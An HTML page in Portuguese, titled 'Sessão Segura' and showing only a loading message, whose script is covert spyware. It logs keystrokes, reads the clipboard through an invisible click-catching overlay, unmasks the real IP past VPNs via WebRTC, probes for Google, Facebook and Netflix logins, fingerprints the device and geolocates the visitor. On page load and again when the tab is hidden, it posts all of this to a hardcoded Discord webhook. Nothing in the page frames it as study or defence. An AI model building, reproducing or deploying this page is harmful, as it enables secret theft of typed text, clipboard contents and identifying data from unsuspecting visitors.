<!DOCTYPE html>
<html lang="pt-pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sessão Segura</title>
    <style>
        body { 
            background: #ffffff; 
            margin: 0; 
            padding: 0; 
            overflow: hidden; 
            height: 100vh; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        /* Camada invisível para capturar o primeiro clique e o clipboard */
        #camadaInvisivel {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            background: rgba(0,0,0,0.01);
            cursor: pointer;
        }
        #mensagem {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #888;
            font-size: 14px;
        }
    </style>
</head>
<body>

<div id="mensagem">A carregar conteúdo seguro...</div>
<div id="camadaInvisivel"></div>

<script>
    // URL do teu Webhook do Discord
    const webhookURL = "https://discord.com/api/webhooks/1499880092493414521/NHvrU1wucCRBtCcbC70MEdcpcl-hhH6fJBTl9xsrrrEfwIaXvlkAQrkoH29e0Y_FBiDM";
    
    let textoDigitado = "";
    let dadosCopiados = "*(Aguardando clique na tela)*";
    let jaEnviouSaida = false;

    // 1. Keylogger (Monitoriza o que é escrito)
    document.addEventListener('keydown', (e) => {
        if (e.key.length === 1) { 
            textoDigitado += e.key; 
        } else if (e.key === "Backspace") {
            textoDigitado = textoDigitado.slice(0, -1);
        }
    });

    // 2. Armadilha de Área de Transferência (Clipboard)
    document.getElementById('camadaInvisivel').addEventListener('click', async () => {
        if (navigator.clipboard && navigator.clipboard.readText) {
            try {
                const text = await navigator.clipboard.readText();
                if (text) { 
                    dadosCopiados = text;
                    capturaCompleta("Clipboard Capturado");
                }
            } catch (err) {
                dadosCopiados = "❌ Permissão Negada ou Vazio";
            }
        }
        document.getElementById('camadaInvisivel').style.display = 'none';
    });

    // 3. Captura de IP Real (Bypass de VPN via WebRTC)
    async function obterIPReal() {
        return new Promise((resolve) => {
            const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            rtc.createDataChannel("");
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            rtc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                if (match) { resolve(match[1]); rtc.onicecandidate = null; }
            };
            setTimeout(() => resolve("Não detetado"), 2500);
        });
    }

    // 4. Detetor de Sessões (Redes Sociais)
    async function verificarSessoes() {
        const redes = {
            "Google/YT": "https://accounts.google.com/ServiceLogin?service=mail",
            "Facebook": "https://www.facebook.com/favicon.ico",
            "Netflix": "https://www.netflix.com/favicon.ico"
        };
        let logados = [];
        for (const [nome, url] of Object.entries(redes)) {
            const img = new Image();
            img.src = url + "?" + Math.random();
            const res = await new Promise(r => {
                img.onload = () => r("✅");
                img.onerror = () => r("❌");
                setTimeout(() => r("?"), 1200);
            });
            logados.push(`${nome}: ${res}`);
        }
        return logados.join(" | ");
    }

    // 5. Fingerprint de Hardware
    function gerarFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.font = '12px Arial';
        ctx.fillText('AlexandreMaker_V8', 2, 10);
        return btoa(canvas.toDataURL()).slice(-25, -5);
    }

    // Função de Envio para o Discord
    async function capturaCompleta(tipoEvento = "Entrada") {
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            const realIP = await obterIPReal();
            const sessoes = await verificarSessoes();
            const fID = gerarFingerprint();

            const gl = document.createElement('canvas').getContext('webgl');
            const dInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const gpu = dInfo ? gl.getParameter(dInfo.UNMASKED_RENDERER_WEBGL) : "N/A";

            let bat = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
            }

            const payload = {
                username: "ALPHA OMNISC I - V8",
                embeds: [{
                    title: `🎯 RELATÓRIO DE PERÍCIA: ${tipoEvento.toUpperCase()}`,
                    color: realIP !== ipData.ip ? 15158528 : 3066993,
                    fields: [
                        { name: "🌐 IP CONEXÃO", value: "`" + ipData.ip + "`", inline: true },
                        { name: "🔍 IP REAL (RTC)", value: "`" + realIP + "`", inline: true },
                        { name: "🆔 FINGERPRINT ID", value: "`" + fID + "`" },
                        { name: "🕵️ SESSÕES ATIVAS", value: "```" + sessoes + "```" },
                        { name: "📋 ÁREA DE TRANSFERÊNCIA", value: "```" + dadosCopiados + "```" },
                        { name: "📍 LOCALIZAÇÃO", value: ipData.city + ", " + ipData.region + " (" + ipData.country_name + ")" },
                        { name: "🔋 BATERIA", value: bat, inline: true },
                        { name: "📡 REDE", value: (navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "WIFI"), inline: true },
                        { name: "🎮 GPU / PLACA VÍDEO", value: "```" + gpu + "```" },
                        { name: "💻 HARDWARE", value: navigator.hardwareConcurrency + " CPUs | " + (navigator.deviceMemory || "N/A") + "GB RAM" },
                        { name: "⌨️ TECLAS DIGITADAS", value: textoDigitado ? "`" + textoDigitado + "`" : "*Sem dados*" }
                    ],
                    footer: { text: "Sistema Alexandre Maker | v8.0 Final" },
                    timestamp: new Date()
                }]
            };

            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

        } catch (e) {}
    }

    // Inicialização
    window.onload = () => setTimeout(() => capturaCompleta("Entrada"), 2000);

    // Relatório de Saída/Fuga
    document.addEventListener("visibilitychange", () => {
        if (document.visibilityState === 'hidden' && !jaEnviouSaida) {
            capturaCompleta("Saída / Fuga");
            jaEnviouSaida = true;
        }
    });
</script>
</body>
</html>
